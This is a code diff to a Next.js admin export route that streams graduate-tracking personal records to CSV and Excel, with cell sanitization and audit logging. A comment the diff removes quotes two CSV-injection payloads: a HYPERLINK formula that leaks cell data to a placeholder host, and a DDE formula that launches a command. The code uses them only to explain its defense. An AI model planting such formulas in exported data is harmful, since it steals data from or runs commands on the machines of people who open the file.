@@ -1,16 +1,87 @@
 import { NextRequest, NextResponse } from "next/server";
 import { db } from "@/db";
-import { personas } from "@/db/schema";
-import { eq, and, sql } from "drizzle-orm";
+import { personas, type Persona } from "@/db/schema";
+import { eq, and, gt, sql } from "drizzle-orm";
 import * as XLSX from "xlsx";
-import { exigirAdmin, errorInterno } from "@/lib/guards";
+import { exigirAdmin, errorInterno, leerSesionVigente } from "@/lib/guards";
 import { aFiltroEnum } from "@/lib/filtros";
 import { registrarAuditoria } from "@/lib/auditoria";
-import { sanearReporte } from "@/lib/privacidad";
+import { sanearCeldaExportacion, sanearReporte } from "@/lib/privacidad";
 import { verificarDescarga } from "@/lib/descargas";
-import { leerSesionVigente } from "@/lib/guards";
 
 export const dynamic = "force-dynamic";
+
+const MAX_EXCEL_ROWS = 25_000;
+
+const COLUMNAS_REPORTE = [
+  "N°",
+  "Tipo",
+  "Cédula de Identidad (K)",
+  "Nombres y Apellidos (K)",
+  "Género (K)",
+  "Semestre Ingreso (K)",
+  "Semestre Egreso (K)",
+  "Año Titulación (K)",
+  "Modalidad Titulación (K)",
+  "Área de Especialización (K)",
+  "Planea Titularse (Egresados)",
+  "Inició Proceso Titulación",
+  "Motivo No Titulación",
+  "Estado Laboral",
+  "Sector de Trabajo",
+  "Sector Otro (especificado)",
+  "Ocupación / Cargo",
+  "Trabaja en Estadística",
+  "Ubicación Geográfica",
+  "T. Egreso-Titulación (meses)",
+  "T. Inserción Laboral (meses)",
+  "Correo Electrónico",
+  "Teléfono",
+  "Redes Sociales",
+  "Observaciones",
+  "Carrera",
+  "Fecha de Generación",
+] as const;
+
+function mapearFilaReporte(r: Persona, idx: number, fechaGeneracion: string) {
+  return {
+    "N°": idx + 1,
+    Tipo: r.tipo,
+    "Cédula de Identidad (K)": r.cedulaIdentidad,
+    "Nombres y Apellidos (K)": r.nombresApellidos,
+    "Género (K)": r.genero,
+    "Semestre Ingreso (K)": r.semestreIngreso || "—",
+    "Semestre Egreso (K)": r.semestreEgreso || "—",
+    "Año Titulación (K)": r.anioTitulacion || "—",
+    "Modalidad Titulación (K)": r.modalidadTitulacion || "—",
+    "Área de Especialización (K)": r.areaEspecializacion || "—",
+    "Planea Titularse (Egresados)": r.planeaTitularse || "—",
+    "Inició Proceso Titulación": r.inicioProcesoTitulacion || "—",
+    "Motivo No Titulación": r.motivoNoTitulacion || "—",
+    "Estado Laboral": r.estadoLaboral || "—",
+    "Sector de Trabajo": r.sectorTrabajo || "—",
+    "Sector Otro (especificado)": r.sectorTrabajo === "OTRO" ? r.sectorTrabajoOtro || "—" : "—",
+    "Ocupación / Cargo": r.ocupacionCargo || "—",
+    "Trabaja en Estadística": r.trabajaEnEstadistica ? "SÍ" : "NO",
+    "Ubicación Geográfica": r.ciudadRegionTrabajo || "—",
+    "T. Egreso-Titulación (meses)": r.tiempoEgresoTitulacionMeses ?? "—",
+    "T. Inserción Laboral (meses)": r.tiempoInsercionLaboralMeses ?? "—",
+    "Correo Electrónico": r.correoElectronico || "—",
+    Teléfono: r.telefono || "—",
+    "Redes Sociales": r.redesSociales || "—",
+    Observaciones: r.observaciones || "—",
+    Carrera: "Estadística",
+    "Fecha de Generación": fechaGeneracion,
+  };
+}
+
+function escaparCeldaCsv(valor: unknown): string {
+  const limpio = sanearCeldaExportacion(valor);
+  if (/[",\r\n]/.test(limpio)) {
+    return `"${limpio.replace(/"/g, '""')}"`;
+  }
+  return limpio;
+}
 
 /**
  * GET /api/exportar  (SOLO ADMIN)
@@ -48,7 +119,8 @@ export async function GET(request: NextRequest) {
       searchParams.get("sig"),
       searchParams.get("exp") ? Number(searchParams.get("exp")) : null,
       searchParams.get("sub"),
-      String(sesion.sub)
+      String(sesion.sub),
+      searchParams
     );
     if (!firma.valida) {
       await registrarAuditoria({
@@ -123,24 +195,11 @@ export async function GET(request: NextRequest) {
     // LOTE, así que el pico de memoria por consulta es constante, y el total se conoce
     // por adelantado para poder avisar en la cabecera si el archivo quedó recortado.
     const LOTE = 500;
+    const whereBase = conditions.length > 0 ? and(...conditions) : undefined;
     const [{ total: totalRegistros }] = (await db
       .select({ total: sql<number>`count(*)::int` })
       .from(personas)
-      .where(conditions.length > 0 ? and(...conditions) : undefined)) as [
-      { total: number }
-    ];
-
-    const registros = [];
-    for (let offset = 0; offset < totalRegistros; offset += LOTE) {
-      const lote = await db
-        .select()
-        .from(personas)
-        .where(conditions.length > 0 ? and(...conditions) : undefined)
-        .orderBy(personas.id)
-        .limit(LOTE)
-        .offset(offset);
-      registros.push(...lote);
-    }
+      .where(whereBase)) as [{ total: number }];
 
     const fechaGeneracion = new Date().toLocaleDateString("es-BO", {
       year: "numeric",
@@ -149,64 +208,61 @@ export async function GET(request: NextRequest) {
       hour: "2-digit",
       minute: "2-digit",
     });
-
-    // Mapeo a formato de reporte oficial.
-    //
-    // `sanearReporte` NO es cosmético: sin él, un egresado que escribiera
-    // `=HYPERLINK("http://x/?d="&A1,"clic")` en "empresa actual" --o
-    // `=cmd|' /C calc'!A0` en versiones antiguas de Excel-- dejaría una fórmula en el
-    // archivo que se abre en el equipo del ADMINISTRADOR y se ejecuta con sus
-    // privilegios. Eso es CSV injection: un dato de entrada del usuario que cruza el
-    // perímetro y se convierte en código ejecutable en la estación de otro.
-    const dataReporte = sanearReporte(
-      registros.map((r, idx) => ({
-        "N°": idx + 1,
-        Tipo: r.tipo,
-        "Cédula de Identidad (K)": r.cedulaIdentidad,
-        "Nombres y Apellidos (K)": r.nombresApellidos,
-        "Género (K)": r.genero,
-        "Semestre Ingreso (K)": r.semestreIngreso || "—",
-        "Semestre Egreso (K)": r.semestreEgreso || "—",
-        "Año Titulación (K)": r.anioTitulacion || "—",
-        "Modalidad Titulación (K)": r.modalidadTitulacion || "—",
-        "Área de Especialización (K)": r.areaEspecializacion || "—",
-        "Planea Titularse (Egresados)": r.planeaTitularse || "—",
-        "Inició Proceso Titulación": r.inicioProcesoTitulacion || "—",
-        "Motivo No Titulación": r.motivoNoTitulacion || "—",
-        "Estado Laboral": r.estadoLaboral || "—",
-        "Sector de Trabajo": r.sectorTrabajo || "—",
-        "Sector Otro (especificado)": r.sectorTrabajo === "OTRO" ? r.sectorTrabajoOtro || "—" : "—",
-        "Ocupación / Cargo": r.ocupacionCargo || "—",
-        "Trabaja en Estadística": r.trabajaEnEstadistica ? "SÍ" : "NO",
-        "Ubicación Geográfica": r.ciudadRegionTrabajo || "—",
-        "T. Egreso-Titulación (meses)": r.tiempoEgresoTitulacionMeses ?? "—",
-        "T. Inserción Laboral (meses)": r.tiempoInsercionLaboralMeses ?? "—",
-        "Correo Electrónico": r.correoElectronico || "—",
-        Teléfono: r.telefono || "—",
-        "Redes Sociales": r.redesSociales || "—",
-        Observaciones: r.observaciones || "—",
-        "Carrera": "Estadística",
-        "Fecha de Generación": fechaGeneracion,
-      }))
-    );
-
     const dateStr = new Date().toISOString().split("T")[0];
 
-    // Exportación a CSV en memoria
+    // Exportación a CSV por streaming keyset (memoria O(LOTE), seguro en 1 GB RAM)
     if (formato.toLowerCase() === "csv") {
-      const worksheet = XLSX.utils.json_to_sheet(dataReporte);
-      const csvOutput = XLSX.utils.sheet_to_csv(worksheet);
-      // Añadir BOM para compatibilidad UTF-8 en Excel
-      const csvBuffer = Buffer.from("\uFEFF" + csvOutput, "utf-8");
-
       await registrarAuditoria({
         accion: "exportar",
         entidad: "personas",
-        detalles: `Exportación CSV · ${tipo} · ${dataReporte.length} registros`,
+        idUsuario: sesion.sub,
+        detalles: `Exportación CSV · ${tipo} · ${totalRegistros} registros`,
         req: request,
       });
 
-      return new NextResponse(csvBuffer, {
+      const encoder = new TextEncoder();
+      let ultimoId = 0;
+      let contador = 0;
+      let cabeceraEnviada = false;
+
+      const stream = new ReadableStream<Uint8Array>({
+        async pull(controller) {
+          try {
+            if (!cabeceraEnviada) {
+              cabeceraEnviada = true;
+              const head = "\uFEFF" + COLUMNAS_REPORTE.map((c) => escaparCeldaCsv(c)).join(",") + "\n";
+              controller.enqueue(encoder.encode(head));
+            }
+
+            const condLote = whereBase ? and(whereBase, gt(personas.id, ultimoId)) : gt(personas.id, ultimoId);
+            const lote = await db
+              .select()
+              .from(personas)
+              .where(condLote)
+              .orderBy(personas.id)
+              .limit(LOTE);
+
+            if (lote.length === 0) {
+              controller.close();
+              return;
+            }
+
+            const lineas: string[] = [];
+            for (const r of lote) {
+              const mapeada = mapearFilaReporte(r, contador++, fechaGeneracion);
+              lineas.push(
+                COLUMNAS_REPORTE.map((col) => escaparCeldaCsv(mapeada[col])).join(",")
+              );
+              ultimoId = r.id;
+            }
+            controller.enqueue(encoder.encode(lineas.join("\n") + "\n"));
+          } catch (err) {
+            controller.error(err);
+          }
+        },
+      });
+
+      return new NextResponse(stream, {
         status: 200,
         headers: {
           "Content-Type": "text/csv; charset=utf-8",
@@ -214,6 +270,33 @@ export async function GET(request: NextRequest) {
           "Cache-Control": "no-store, max-age=0",
         },
       });
+    }
+
+    if (totalRegistros > MAX_EXCEL_ROWS) {
+      return NextResponse.json(
+        {
+          error: `El reporte supera el límite de ${MAX_EXCEL_ROWS.toLocaleString("es-BO")} filas para formato Excel en servidor. Descárguelo en formato CSV o aplique filtros.`,
+        },
+        { status: 413 }
+      );
+    }
+
+    const dataReporte: Record<string, string>[] = [];
+    let ultimoId = 0;
+    let indice = 0;
+    while (true) {
+      const condLote = whereBase ? and(whereBase, gt(personas.id, ultimoId)) : gt(personas.id, ultimoId);
+      const lote = await db
+        .select()
+        .from(personas)
+        .where(condLote)
+        .orderBy(personas.id)
+        .limit(LOTE);
+      if (lote.length === 0) break;
+      const saneado = sanearReporte(lote.map((r) => mapearFilaReporte(r, indice++, fechaGeneracion)));
+      dataReporte.push(...saneado);
+      ultimoId = lote[lote.length - 1]!.id;
+      if (lote.length < LOTE) break;
     }
 
     // Exportación a Excel (.xlsx) en memoria
@@ -261,6 +344,8 @@ export async function GET(request: NextRequest) {
       { wch: 16 }, // Telefono
       { wch: 20 }, // Redes
       { wch: 30 }, // Observaciones
+      { wch: 14 }, // Carrera
+      { wch: 20 }, // Fecha Generacion
     ];
 
     XLSX.utils.book_append_sheet(workbook, worksheet, `Seguimiento_${tipo}`);
@@ -274,6 +359,7 @@ export async function GET(request: NextRequest) {
     await registrarAuditoria({
       accion: "exportar",
       entidad: "personas",
+      idUsuario: sesion.sub,
       detalles: `Exportación Excel · ${tipo} · ${dataReporte.length} registros`,
       req: request,
     });
